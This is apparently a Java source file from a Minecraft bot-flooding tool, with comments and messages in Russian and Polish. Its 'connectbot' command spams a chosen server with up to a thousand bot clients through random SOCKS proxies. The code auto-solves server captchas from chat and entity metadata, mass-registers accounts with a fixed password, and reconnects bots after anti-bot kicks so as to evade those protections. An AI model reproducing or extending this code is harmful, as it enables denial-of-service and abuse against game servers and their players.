package ru.crashdami.emortality.command.commands.bots;

import org.spacehq.mc.protocol.MinecraftProtocol;
import org.spacehq.mc.protocol.data.SubProtocol;
import org.spacehq.mc.protocol.data.game.values.MessageType;
import org.spacehq.mc.protocol.data.game.values.entity.MetadataType;
import org.spacehq.mc.protocol.data.status.ServerStatusInfo;
import org.spacehq.mc.protocol.data.status.handler.ServerInfoHandler;
import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
import org.spacehq.mc.protocol.packet.ingame.client.ClientKeepAlivePacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerChatPacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerDisconnectPacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
import org.spacehq.mc.protocol.packet.ingame.server.entity.spawn.ServerSpawnMobPacket;
import org.spacehq.mc.protocol.packet.login.server.LoginDisconnectPacket;
import org.spacehq.packetlib.Client;
import org.spacehq.packetlib.Session;
import org.spacehq.packetlib.event.session.*;
import org.spacehq.packetlib.tcp.TcpSessionFactory;
import ru.crashdami.emortality.Group;
import ru.crashdami.emortality.managers.MacroManager;
import ru.crashdami.emortality.managers.ProxyManager;
import ru.crashdami.emortality.objects.Bot;
import ru.crashdami.emortality.objects.Macro;
import ru.crashdami.emortality.objects.Player;
import ru.crashdami.emortality.command.Command;
import ru.crashdami.emortality.utils.PacketUtil;

import java.net.Proxy;
import java.util.Random;

public class ConnectBotCommand extends Command {

    public ConnectBotCommand() {
        super("connectbot", "Заспамить сервер ботами!", ",connectbot [сервер:порт] [количество] [пинг] [задержка] [тип прокси: none/private] [айди макро/none]",
                Group.USER, "joinbot", "connectbots", "joinbots");
    }

    @Override
    public void onCommand(Player p, Command command, String[] args) {
        if (args.length == 0 || args.length < 7) {
            p.sendMessage("$p &7Правильное использование: &b" + getUsage());
            return;
        } else {
            final String host = args[1].split(":")[0];
            final Integer port = Integer.parseInt(args[1].split(":")[1]);
            final Integer amount = Integer.parseInt(args[2]);
            final Boolean ping = Boolean.parseBoolean(args[3]);
            final Long delay = Long.parseLong(args[4]);
            final java.net.Proxy proxy;
            final Macro macro;
            if (args[6].contains("none") || args[6].contains("null")) {
                macro = null;
            } else {
                macro = MacroManager.getMacroById(Integer.parseInt(args[6]));
            }
            /*if (args[5].contains(":")) {
                proxy = new java.net.Proxy(java.net.Proxy.Type.SOCKS,
                        new InetSocketAddress(args[5].split(":")[0],
                                Integer.valueOf(args[5].split(":")[1])));
                p.sendMessage("$p &7Айпи прокси: &bspecified&7 &8(&7" + proxy.address().toString().split(":")[0] + ":"
                        + proxy.address().toString().split(":")[1] + "&8)");*/
            if (args[5].contains("private") || args[5].contains("top")) {
                proxy = null;
                p.sendMessage("$p &7Прокси: &bprivate");
            } else {
                p.sendMessage("$p &7Прокси: &bnull &8(&70:0&8)");
                proxy = java.net.Proxy.NO_PROXY;
            }
            connectBots(p, amount, host, port, delay, ping, proxy, macro);
        }
    }

    private void connectBots(Player owner, int amount, String host, Integer port, long msDelay, boolean ping, Proxy proxy, Macro macro) {
        owner.sendMessage("$p &b" + amount + " &7Ботов подключаются на сервер: &b"
                + host + " &8(" + port + ")&7, Айди макроса: &b" + ((macro == null) ? "none" :
                Integer.toString(macro.getId())));
        //owner.sendMessage("$p &7Boty lacza za chwile do serwera: &b" + host + "&7, delay: &b" + msDelay + "ms&7, ilosc botow: &b" + amount);
        final Random rand = new Random();
        final Proxy proksi;
        if (proxy == null)
            proksi = ProxyManager.getRandomProxy();
        else
            proksi = proxy;
        for (int i = 0; i < amount; i++) {

            final int i2 = i + 1;
            new Thread(() -> {
                final String nick = rand.nextInt(99999) + "_e";
                connectBot(owner, nick, host, port, ping, msDelay, proksi, macro, i2, amount, true);
            }).start();
            if (msDelay != 0) {
                try {
                    Thread.sleep(msDelay);
                } catch (InterruptedException ex) {
                    owner.sendMessage("$p &cОшибка! &7" + ex.getMessage());
                }
            }
        }
    }

    private void connectBot(Player owner, String nick, String host, int port, boolean ping, long msDelay, Proxy proxy, Macro macro, final int amount, final int maxamount, boolean msg) {
        if (amount == 1 || amount == 10 || amount == 25 || amount == 40 || amount == 50 || amount == 70 || amount == 90 || amount == 100 || amount == 150 || amount == 200 || amount == 250 || amount == 300 || amount == 350 || amount == 400 || amount == 450 || amount == 500 || amount == 550 || amount == 600 || amount == 700 || amount == 800 || amount == 900 || amount == 1000) {
            owner.sendMessage("$p &bБот &7" + nick + " &b(количество: " + amount + "/" + maxamount + ", прокси: " + ((proxy == null || proxy == Proxy.NO_PROXY) ? "null, ip: 0, port: 0" : ("SOCKS, ip: " + proxy.address().toString().split(":")[0] + ", port: " + proxy.address().toString().split(":")[1])) + " &blaczy do: &7" + host + ":" + port + "&b)");
        }
        final Client c = new Client(host, port, new MinecraftProtocol(nick), new TcpSessionFactory(proxy));
        c.getSession().setConnectTimeout(owner.botOptions.timeOutConnect);
        if (ping) {
            final MinecraftProtocol protocol = new MinecraftProtocol(SubProtocol.STATUS);
            final Client client = new Client(host, port, protocol, new TcpSessionFactory(proxy));
            client.getSession().setConnectTimeout(owner.botOptions.timeOutPing);
            client.getSession().setFlag("server-info-handler", new ServerInfoHandler() {
                @Override
                public void handle(final Session session, final ServerStatusInfo info) {
                    client.getSession().disconnect("пингуется.");
                }
            });
            client.getSession().connect();
        }
        c.getSession().connect();
        final Bot bot = new Bot(owner, nick, c.getSession());
        c.getSession().addListener(new SessionListener() {
            @Override
            public void packetReceived(PacketReceivedEvent e) {
                if (e.getPacket() instanceof ServerChatPacket) {
                    if (owner.playerOptions.chatFromBots && ((ServerChatPacket) e.getPacket()).getMessage() != null) {
                        if (((ServerChatPacket) e.getPacket()).getType() != MessageType.CHAT) return;
                        owner.sendMessage("&7[Бот &b" + nick + "&7]");
                        owner.sendMessage(((ServerChatPacket) e.getPacket()).getMessage().getText());
                        owner.sendMessage("&7[Бот &b" + nick + "&7]");
                    }
                }
                //autocaptcha
                if (e.getPacket() instanceof ServerChatPacket) {
                    PacketUtil.sendJoinPayload(e.getSession());
                    if (owner.botOptions.autoCaptcha) {
                        if (e.getSession().getHost().contains("proxy")) return;
                        final ServerChatPacket p3 = e.getPacket();
                        if (p3.getMessage().toString().toLowerCase().contains("captcha:") || p3.getMessage().toString().toLowerCase().contains("капчу:") || p3.getMessage().toString().toLowerCase().contains("капч") || p3.getMessage().toString().toLowerCase().contains("код") || p3.getMessage().toString().toLowerCase().contains("code")) {
                            if (e.getSession().getHost().contains("megaxcore")) return;
                            final String message = p3.getMessage().toString();
                            final String[] args2 = message.split(":");
                            if (args2.length < 2 || args2[1] == null) return;
                            args2[1] = args2[1].replace(" ", "");
                            owner.sendMessage("$p &7Капча решена: &b" + args2[1]);
                            e.getSession().send(new ClientChatPacket("/captcha " + args2[1]));
                            e.getSession().send(new ClientChatPacket(args2[1]));
                            e.getSession().send(new ClientChatPacket("/register " + args2[1] + " ebot123qweqweaa ebot123qweqweaa"));
                            e.getSession().send(new ClientChatPacket("/register ebot123qweqweaa ebot123qweqweaa " + args2[1]));
                        } else if (p3.getMessage().toString().toLowerCase().contains("captcha:") || p3.getMessage().toString().toLowerCase().contains("капчу:") || p3.getMessage().toString().toLowerCase().contains("капч:") || p3.getMessage().toString().toLowerCase().contains("код:") || p3.getMessage().toString().toLowerCase().contains("code:")) {
                            if (e.getSession().getHost().contains("megaxcore")) return;
                            final String message = p3.getMessage().toString();
                            final String[] args2 = message.split("to ");
                            if (args2.length < 2 || args2[1] == null) return;
                            args2[1] = args2[1].replace(" ", "");
                            owner.sendMessage("$p &7Капча решена: &b" + args2[1]);
                            e.getSession().send(new ClientChatPacket("/captcha " + args2[1]));
                            e.getSession().send(new ClientChatPacket(args2[1]));
                            e.getSession().send(new ClientChatPacket("/register " + args2[1] + " ebot123qweqweaa ebot123qweqweaa"));
                            e.getSession().send(new ClientChatPacket("/register ebot123qweqweaa ebot123qweqweaa " + args2[1]));
                        }
                    }
                    return;
                }
                //autocaptcha
                else if (e.getPacket() instanceof ServerSpawnMobPacket && owner.botOptions.autoCaptcha) {
                    final ServerSpawnMobPacket p3 = e.getPacket();
                    for (int i = 0; i < p3.getMetadata().length; ++i) {
                        if (p3.getMetadata()[i].getType() == MetadataType.STRING) {
                            final String msg2 = p3.getMetadata()[i].getValue().toString();
                            if (msg2.toLowerCase().contains("captcha:") || msg2.toLowerCase().contains("kod:")) {
                                final String[] args2 = msg2.split(":");
                                if (args2.length < 2 || args2[1] == null) {
                                    return;
                                }
                                args2[1] = args2[1].replace(" ", "");
                                args2[1] = args2[1].replace("§c", "");
                                args2[1] = args2[1].replace("§e", "");
                                args2[1] = args2[1].replace("§6", "");
                                args2[1] = args2[1].replace("§a", "");
                                args2[1] = args2[1].replace("§b", "");
                                args2[1] = args2[1].replace("§2", "");
                                e.getSession().send(new ClientChatPacket("/captcha " + args2[1]));
                                e.getSession().send(new ClientChatPacket(args2[1]));
                                e.getSession().send(new ClientChatPacket("/register " + args2[1] + " ebot123qweqweaa ebot123qweqweaa"));
                                e.getSession().send(new ClientChatPacket("/register ebot123qweqweaa ebot123qweqweaa " + args2[1]));
                            }
                        }
                    }
                }
                if (e.getPacket() instanceof ServerJoinGamePacket) {
                    if (owner.botOptions.join)
                        owner.sendMessage("$p &7Бот &b" + nick + "&7 подключился : &b" + host + ":" + port + " &8(&b" + amount + "&7/&2" + maxamount + "&8)");
                    if (owner.botOptions.autoLogin) {
                        c.getSession().send(new ClientChatPacket("/register ebot123qweqweaa ebot123qweqweaa"));
                        c.getSession().send(new ClientChatPacket("/l ebot123qweqweaa"));
                    }
                    c.getSession().send(new ClientKeepAlivePacket(1));
                    if (macro != null)
                        macro.macroStartDoing(owner, false);
                    owner.addBot(bot);
                } else if (e.getPacket() instanceof ServerDisconnectPacket) {
                    final ServerDisconnectPacket packet = e.getPacket();
                    if (packet.getReason().getFullText().toLowerCase().contains("zaloguj") ||
                            packet.getReason().getFullText().toLowerCase().contains("bot") ||
                            packet.getReason().getFullText().toLowerCase().contains("wejdz")) {
                        if (owner.botOptions.quit)
                            owner.sendMessage("&c[Антибот] &7Бот &b" + nick + "&7 отключился &b" + host + "&7, причина: &b" + packet.getReason());
                        if (owner.botOptions.autoReconnect) {
                            if (owner.botOptions.autoReconnectTime > 0) {
                                try {
                                    Thread.sleep(1000L * owner.botOptions.autoReconnectTime);
                                } catch (InterruptedException ex) {
                                }
                            }
                            c.getSession().disconnect("antibot");
                            connectBot(owner, nick, host, port, ping, msDelay, proxy, macro, amount, maxamount, false);
                        }
                    } else {
                        if (owner.botOptions.quit)
                            owner.sendMessage("&7Бот &b" + nick + "&7 отключился от &b" + host + "&7, причина: &b" + packet.getReason());
                    }
                } else if (e.getPacket() instanceof LoginDisconnectPacket) {
                    final LoginDisconnectPacket packet = e.getPacket();
                    if (packet.getReason().getFullText().toLowerCase().contains("zaloguj") ||
                            packet.getReason().getFullText().toLowerCase().contains("bot") ||
                            packet.getReason().getFullText().toLowerCase().contains("wejdz")) {
                        if (owner.botOptions.quit)
                            owner.sendMessage("&c[Антибот] &7Бот &b" + nick + "&7 отключился от &b" + host + "&7, причина: &b" + packet.getReason());
                        c.getSession().disconnect("antybot");
                        if (owner.botOptions.autoReconnect) {
                            if (owner.botOptions.autoReconnectTime > 0) {
                                try {
                                    Thread.sleep(1000L * owner.botOptions.autoReconnectTime);
                                } catch (InterruptedException ex) {
                                }
                            }
                        }
                        connectBot(owner, nick, host, port, ping, msDelay, proxy, macro, amount, maxamount, false);
                    } else {
                        if (owner.botOptions.quit)
                            owner.sendMessage("&7Бот &b" + nick + "&7 отключился от &b" + host + "&7, причина: &b" + packet.getReason());
                    }
                }
            }

            @Override
            public void packetSent(PacketSentEvent p0) {

            }

            @Override
            public void connected(ConnectedEvent p0) {
            }

            @Override
            public void disconnecting(DisconnectingEvent p0) {

            }

            @Override
            public void disconnected(DisconnectedEvent e) {
                owner.removeBot(bot);
                if (e.getReason().toLowerCase().contains("antibot") || e.getReason().contains("wejdz") ||
                        e.getReason().contains("забанен")) {
                    if (owner.botOptions.quit)
                        owner.sendMessage("&c[Антибот] &7Бот &b" + nick + "&7 отключился от &b" + host + "&7, причина: &b" + e.getReason() + "&7, подробнее: &b"
                                + e.getCause().getMessage());
                    c.getSession().disconnect("antybot");
                    if (owner.botOptions.autoReconnect) {
                        if (owner.botOptions.autoReconnectTime > 0) {
                            try {
                                Thread.sleep(1000L * owner.botOptions.autoReconnectTime);
                            } catch (InterruptedException ex) {
                            }
                        }
                    }
                    connectBot(owner, nick, host, port, ping, msDelay, proxy, macro, amount, maxamount, false);
                } else {
                    if (owner.botOptions.quit)
                        owner.sendMessage("&c[Антибот] &7Бот &b" + nick + "&7 отключился от &b" + host + "&7, причина: &b" + e.getReason() + "&7, подробнее: &b"
                                + e.getCause().getMessage());
                }
            }
        });
    }
}